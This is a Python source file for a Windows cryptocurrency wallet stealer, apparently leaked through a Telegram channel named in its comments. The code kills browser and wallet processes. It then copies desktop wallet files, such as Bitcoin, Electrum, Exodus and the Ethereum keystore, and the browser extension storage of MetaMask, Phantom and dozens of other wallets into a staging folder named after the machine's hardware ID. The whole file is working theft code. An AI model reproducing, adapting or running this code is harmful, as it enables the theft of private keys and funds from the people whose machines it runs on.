import os
import shutil
import uuid
import psutil
import time

# leaked by @scarletta_owner
# ArtHouse Are Scammers
# https://t.me/+ZFUM798YLi5mODUy

browser_processes = ['nexx.exe', 'datafox.exe', 'fossa.exe', 'nanoweb.exe', 'celtic.exe', 'epic.exe', 'qutebrowser.exe', 'flashpeak.exe', 'torch.exe', 'tutanota.exe', 'avant.exe', 'librefox.exe', 'opera.exe', 'flynx.exe', 'superbird.exe', 'eset.exe', 'charm.exe', 'falkon.exe', 'freedom.exe', 'tor.exe', 'surf.exe', 'chedot.exe', 'hotdog.exe', 'whale.exe', 'reborn.exe', 'slimjet.exe', 'firefox.exe', 'palemoon.exe', 'safeguard.exe', 'gnome-web.exe', 'rockmelt.exe', 'basilisk.exe', 'arora.exe', 'epiphany.exe', 'xbrowser.exe', 'webpositive.exe', 'javelin.exe', 'cyberfox.exe', 'otter.exe', 'sleipnir.exe', 'chrome.exe', 'qupzilla.exe', 'penguin.exe', 'novel.exe', 'duckduckgo.exe', 'lunascape.exe', 'webcat.exe', 'k-meleon.exe', 'dragon.exe', 'brave.exe', 'librewolf.exe', 'vivaldi.exe', 'yandex.exe', 'tinfoil.exe', 'polarity.exe', 'polyweb.exe', 'msedge.exe', 'ibrowsr.exe', 'coccoc.exe', 'orbit.exe', 'puffin.exe', 'iron.exe', 'kometa.exe', 'centbrowser.exe', 'medeanalytics.exe', 'slimbrowser.exe', 'midori.exe', 'seamonkey.exe']

wallet_processes = ['argent.exe', 'zengo.exe', 'dapper.exe', 'algorand.exe', 'tezos.exe', 'kinesis.exe', 'guarda.exe', 'paxful.exe', 'gate.io.exe', 'libra.exe', 'bitcoin-cash.exe', 'mycelium.exe', 'trustwallet.exe', 'zcashd.exe', 'nexo.exe', 'okex.exe', 'sushiswap.exe', 'pillar.exe', 'exodus.exe', 'metamask.exe', 'jaxx.exe', 'blockchain.exe', 'celo.exe', 'geth.exe', 'ledger-live.exe', 'trezor.exe', 'electrum.exe', 'filecoin.exe', 'kucoin.exe', 'bytecoin.exe', 'coinbase.exe', 'uniswap.exe', 'bittrex.exe', 'hedera.exe', 'safepal.exe', 'bitcoin-qt.exe', 'crypto.exe', 'bitpay.exe', 'terra.exe', 'blockchain.info.exe', 'stellar.exe', 'ripple.exe', 'pancakeswap.exe', 'bancor.exe', 'bitbns.exe', 'zerion.exe', 'smartbit.exe', 'curve.exe', 'horizon.exe', 'monero.exe', 'bitstamp.exe', '1inch.exe', 'vechain.exe', 'atomic.exe', 'armory.exe', 'coinomi.exe', 'dash.exe']

wallets_ext_names = {
	"MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
	"MetaMask-edge": "ejbalbakoplchlghecdalmeeeajnimhm",
	"Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
	"Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
	"Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
	"Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
	"Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
	"Coin98": "aeachknmefphepccionboohckonoeemg",
	"KardiaChain": "pdadjkfkgcafgbceimcpbkalnfnepbnk",
	"TerraStation": "aiifbnbfobpmeekipheeijimdpnlpgpp",
	"Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
	"Harmony": "fnnegphlobjdpkhecapkijjdkgcjhkib",
	"Nami": "lpfcbjknijpeeillifnkikgncikgfhdo",
	"MartianAptos": "efbglgofoippbgcjepnhiblaibcnclgk",
	"Braavos": "jnlgamecbpmbajjfhmmmlhejkemejdma",
	"XDEFI": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
	"Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
	"TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
	"Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
	"Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
	"Trezor": "lnaonmdpfhbgmhbmhlbbnhegggijcfcg",
	"Ledger": "knjilbhbkmjdjgaebdcejjlmnpagjmei",
	"Mycelium": "mbndjliiknpfmpanccheokhdbbmdaaei",
	"TrustWallet": "eimcpmfpjgojopihlhfjkaklpfkmhglp",
	"Ellipal": "klkbpbgfplbofepkbkaodljfifmohokb",
	"Dapper": "cimfefinodkjoijcbgffjnmklmnngjge",
	"BitKeep": "nfdgfjplkllcbmnlpnfkpidijlnfjfjj",
	"Argent": "jbecljpfobbfnhmpgbdgmjajmbgdckgj",
	"Blockchain Wallet": "bmnjpfboeieiejchjibfbaiidbdgknjl",
	"cryptocom-wallet-extensio": "hifafgmccdpekplomjjkcfgodnhcellj",
	"Zerion": "hekjcgjfhbldlcfbjdfpmhkjjpmppjcf",
	"Aave": "neihkdpkimcjokhblhpfnjmfklkpjkpj",
	"Curve": "dofnkedmjpfpjncpgijbffklkmdolnkk",
	"SushiSwap": "hlbocmgldbcopjfhfmicmdhngbkjdgmj",
	"Uniswap": "jgfjjpnnphjkjiecligjdnfmbmhbajpm",
	"1inch": "bfbijoiifjbkbbajgjgdkmceibjlcbj",
	"okx-wallet": "mcohilncbfahbmgdjkbpemcciiolgcge",
	"unisat-wallet": "ppbibelpcjmhbdihakflkdcoccbgbkpo",
	"petra-aptos-wallet": "ejjladinnckdgjemekebdpeokbikhfci",
	"xdefi-wallet": "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
	"manta-wallet": "enabgbdfcbaehmbigakijjabdpdnimlg",
	"rose-wallet": "ppdadbejkmjnefldpcdjhnkpbjkikoip",
	"wallet-guard-protect-your": "pdgbckgdncnhihllonhnjbdoighgpimk",
	"subwallet-polkadot-wallet": "onhogfjeacnfoofkfgppdlbmlmnplgbn",
	"argent-x-starknet-wallet": "dlcobpjiigpikoobohmabehhmhfoodbb",
	"bitget-wallet-formerly-bi": "jiidiaalihmmhddjgbnbgdfflelocpak",
	"core-crypto-wallet-nft-ex": "agoakfejjabomempkjlepdflaleeobhb",
	"braavos-starknet-wallet": "jnlgamecbpmbajjfhmmmlhejkemejdma",
	"keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
	"martian-aptos-sui-wallet": "efbglgofoippbgcjepnhiblaibcnclgk",
	"xverse-wallet": "idnnbdplmphpflfnlkomgpfbpcgelopg",
	"gate-wallet": "cpmkedoipcpimgecpmgpldfpohjplkpp",
	"sender-wallet": "epapihdplajcdnnkdeiahlgigofloibg",
	"desig-wallet": "panpgppehdchfphcigocleabcmcgfoca",
	"fewcha-move-wallet": "ebfidpplhabeedpnhjnobghokpiioolj",
	"keplr-edge": "ocodgmmffbkkeecmadcijjhkmeohinei",
}

wallet_local_paths = {
	"Bitcoin": os.path.join(os.getenv("APPDATA"), "Bitcoin", "wallets"),
	"Zcash": os.path.join(os.getenv("APPDATA"), "Zcash"),
	"Armory": os.path.join(os.getenv("APPDATA"), "Armory"),
	"Bytecoin": os.path.join(os.getenv("APPDATA"), "bytecoin"),
	"Jaxx": os.path.join(os.getenv("APPDATA"), "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
	"Exodus": os.path.join(os.getenv("APPDATA"), "Exodus", "exodus.wallet"),
	"Ethereum": os.path.join(os.getenv("APPDATA"), "Ethereum", "keystore"),
	"Electrum": os.path.join(os.getenv("APPDATA"), "Electrum", "wallets"),
	"AtomicWallet": os.path.join(os.getenv("APPDATA"), "atomic", "Local Storage", "leveldb"),
	"Guarda": os.path.join(os.getenv("APPDATA"), "Guarda", "Local Storage", "leveldb"),
	"Coinomi": os.path.join(os.getenv("APPDATA"), "Coinomi", "Coinomi", "wallets"),
	"TrustWallet": os.path.join(os.getenv("APPDATA"), "Trust Wallet", "wallets"),
	"Dapper": os.path.join(os.getenv("APPDATA"), "Dapper", "wallets"),
	"Zerion": os.path.join(os.getenv("APPDATA"), "Zerion", "wallets"),
	"Argent": os.path.join(os.getenv("APPDATA"), "Argent", "wallets"),
	"Curve": os.path.join(os.getenv("APPDATA"), "Curve", "wallets"),
	"SushiSwap": os.path.join(os.getenv("APPDATA"), "SushiSwap", "wallets"),
	"Uniswap": os.path.join(os.getenv("APPDATA"), "Uniswap", "wallets"),
	"1inch": os.path.join(os.getenv("APPDATA"), "1inch", "wallets"),
}

browser_user_data_paths = {
	"Google Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
	"Microsoft Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
	"Opera": os.path.join(os.getenv("LOCALAPPDATA"), "Opera Software", "Opera Stable"),
	"Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
	"Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
	"Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
	"Slimjet": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
	"Epic": os.path.join(os.getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data"),
	"Comodo Dragon": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
	"Cent Browser": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
	"QuteBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "QuteBrowser", "User Data"),
	"Falkon": os.path.join(os.getenv("LOCALAPPDATA"), "Falkon", "User Data"),
	"Naver Whale": os.path.join(os.getenv("LOCALAPPDATA"), "Naver", "Whale", "User Data"),
	"SRWare Iron": os.path.join(os.getenv("LOCALAPPDATA"), "SRWare Iron", "User Data"),
	"Blisk": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk", "User Data"),
	"Iron": os.path.join(os.getenv("LOCALAPPDATA"), "Iron", "User Data"),
	"Torch": os.path.join(os.getenv("LOCALAPPDATA"), "Torch", "User Data"),
	"Coc Coc": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
	"Polarity": os.path.join(os.getenv("LOCALAPPDATA"), "Polarity", "User Data"),
	"Javelin": os.path.join(os.getenv("LOCALAPPDATA"), "Javelin", "User Data"),
	"Orbit": os.path.join(os.getenv("LOCALAPPDATA"), "Orbit", "User Data"),
	"Chedot": os.path.join(os.getenv("LOCALAPPDATA"), "Chedot", "User Data"),
	"Lunascape": os.path.join(os.getenv("LOCALAPPDATA"), "Lunascape", "User Data"),
	"Otter Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Otter", "User Data"),
	"Pale Moon": os.path.join(os.getenv("LOCALAPPDATA"), "PaleMoon", "User Data"),
	"Tutanota": os.path.join(os.getenv("LOCALAPPDATA"), "Tutanota", "User Data"),
	"DuckDuckGo": os.path.join(os.getenv("LOCALAPPDATA"), "DuckDuckGo", "User Data"),
	"SafeGuard": os.path.join(os.getenv("LOCALAPPDATA"), "SafeGuard", "User Data"),
	"XBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "XBrowser", "User Data"),
	"MedeAnalytics": os.path.join(os.getenv("LOCALAPPDATA"), "MedeAnalytics", "User Data"),
	"Tinfoil": os.path.join(os.getenv("LOCALAPPDATA"), "Tinfoil", "User Data"),
	"Falkon": os.path.join(os.getenv("LOCALAPPDATA"), "Falkon", "User Data"),
	"QuteBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "QuteBrowser", "User Data"),
	"Vivaldi Snapshot": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot", "User Data"),
	"Comodo IceDragon": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "IceDragon", "User Data"),
	"WebCat": os.path.join(os.getenv("LOCALAPPDATA"), "WebCat", "User Data"),
	"Orbit Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Orbit", "User Data"),
	"Basilisk": os.path.join(os.getenv("LOCALAPPDATA"), "Basilisk", "User Data"),
	"QuteBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "QuteBrowser", "User Data"),
	"Falkon": os.path.join(os.getenv("LOCALAPPDATA"), "Falkon", "User Data"),
	"Vivaldi Snapshot": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi Snapshot", "User Data"),
	"Iron Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Iron", "User Data"),
	"Coc Coc Browser": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
	"Cent Browser": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
	"Comodo Dragon": os.path.join(os.getenv("LOCALAPPDATA"), "Comodo", "Dragon", "User Data"),
	"Naver Whale": os.path.join(os.getenv("LOCALAPPDATA"), "Naver", "Whale", "User Data"),
	"Blisk": os.path.join(os.getenv("LOCALAPPDATA"), "Blisk", "User Data"),
	"Polarity": os.path.join(os.getenv("LOCALAPPDATA"), "Polarity", "User Data"),
	"Javelin": os.path.join(os.getenv("LOCALAPPDATA"), "Javelin", "User Data"),
	"Tutanota Web Client": os.path.join(os.getenv("LOCALAPPDATA"), "Tutanota", "User Data"),
	"Tinfoil for Facebook": os.path.join(os.getenv("LOCALAPPDATA"), "Tinfoil", "Facebook", "User Data"),
	"DuckDuckGo Browser": os.path.join(os.getenv("LOCALAPPDATA"), "DuckDuckGo", "User Data"),
	"SafeGuard Browser": os.path.join(os.getenv("LOCALAPPDATA"), "SafeGuard", "Browser", "User Data"),
	"XBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "XBrowser", "User Data"),
	"Javelin Browser": os.path.join(os.getenv("LOCALAPPDATA"), "Javelin", "User Data"),
	"Basilisk": os.path.join(os.getenv("LOCALAPPDATA"), "Basilisk", "User Data"),
}

def kill_processes(process_names, attempts=10, delay=0.1):
	for _ in range(attempts):
		print(f"[*] Attempt {_+1} to kill processes...")
		for process in psutil.process_iter(["pid", "name"]):
			try:
				if process.info["name"].lower() in [process.lower() for process in process_names]:
					print(f"[*] Killing process: {process.info['name']} (PID: {process.info['pid']})")
					process.terminate()
			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
				pass
		time.sleep(delay)

def get_hwid():
	try:
		return str(uuid.getnode())
	except Exception as E:
		print(f"[!] Error getting HWID: {E}")
		return

def find_folder_by_hwid(base_path, hwid):
	try:
		for file in os.listdir(base_path):
			file_path = os.path.join(base_path, file)
			if os.path.isdir(file_path) and file == hwid:
				return file_path
		return
	except Exception as E:
		print(f"[!] Error finding folder by HWID: {E}")
		return

def copy_wallet_data(wallet_name, source_path, dest_folder):
	try:
		if os.path.exists(source_path):
			file_path = os.path.join(dest_folder, wallet_name)
			if not os.path.exists(file_path):
				os.makedirs(file_path)
			if os.path.isfile(source_path):
				shutil.copy(source_path, file_path)
			elif os.path.isdir(source_path):
				shutil.copytree(source_path, file_path, dirs_exist_ok=True)
	except (PermissionError, OSError) as E:
		print(f"[!] Error copying {source_path}: {E}")
	except Exception as E:
		print(f"[!] Unexpected error copying {source_path}: {E}")

def copy_extension_data(browser_name, user_data_path, dest_folder):
	try:
		for file in os.listdir(user_data_path):
			filepath = os.path.join(user_data_path, file)
			if os.path.isdir(filepath) and file != "System Profile":
				setting_path = os.path.join(filepath, "Local Extension Settings")
				if os.path.exists(setting_path):
					for file2 in os.listdir(setting_path):
						if file2 in wallets_ext_names.values():
							I = [A for (A, B) in wallets_ext_names.items() if B == file2][0]
							src = os.path.join(setting_path, file2)
							dest = os.path.join(dest_folder, file, f"{I}_{file2}")
							try:
								os.makedirs(os.path.dirname(dest), exist_ok=True)
								if not os.path.exists(dest):
									shutil.copytree(src, dest, dirs_exist_ok=True)
							except (PermissionError, OSError) as E:
								print(f"[!] Error copying {src} to {dest}: {E}")
							except Exception as E:
								print(f"[!] Unexpected error copying {src} to {dest}: {E}")
	except Exception as E:
		print(f"[!] Error copying extension data: {E}")

if __name__ == "__main__":
	if os.name == 'nt':
		print("[*] Killing browser processes...")
		kill_processes(browser_processes)
		print("[*] Killing wallet processes...")
		kill_processes(wallet_processes)
		print("[+] Done.")
		time.sleep(1)

		hwid = get_hwid()
		if not hwid:
			print("[!] Unable to proceed without HWID.")
			exit(1)

		searches_directory = os.path.join(os.getenv("USERPROFILE"), "Documents")
		hwid_folder = find_folder_by_hwid(searches_directory, hwid)
		if not hwid_folder:
			hwid_folder = os.path.join(searches_directory, hwid)
			try:
				if not os.path.exists(hwid_folder):
					os.makedirs(hwid_folder)
			except Exception as e:
				print(f"[!] Error creating HWID folder: {e}")
				exit(1)

		wallets_folder = os.path.join(hwid_folder, "Wallets")
		if not os.path.exists(wallets_folder):
			try:
				os.makedirs(wallets_folder)
			except Exception as e:
				print(f"[!] Error creating wallets folder: {e}")
				exit(1)

		for wallet_name, source_path in wallet_local_paths.items():
			copy_wallet_data(wallet_name, source_path, wallets_folder)

		for browser_name, user_data_path in browser_user_data_paths.items():
			if os.path.exists(user_data_path) and os.path.isdir(user_data_path):
				ex_folder = os.path.join(wallets_folder, f"{browser_name}Ex")
				if not os.path.exists(ex_folder):
					try:
						os.makedirs(ex_folder)
					except Exception as e:
						print(f"[!] Error creating extension folder for {browser_name}: {e}")
						continue
				copy_extension_data(browser_name, user_data_path, ex_folder)
			else:
				print(f"[!] User data path for {browser_name} not found or invalid: {user_data_path}")

		print("[+] Wallet data extraction completed.")
	else:
		os._exit(0)
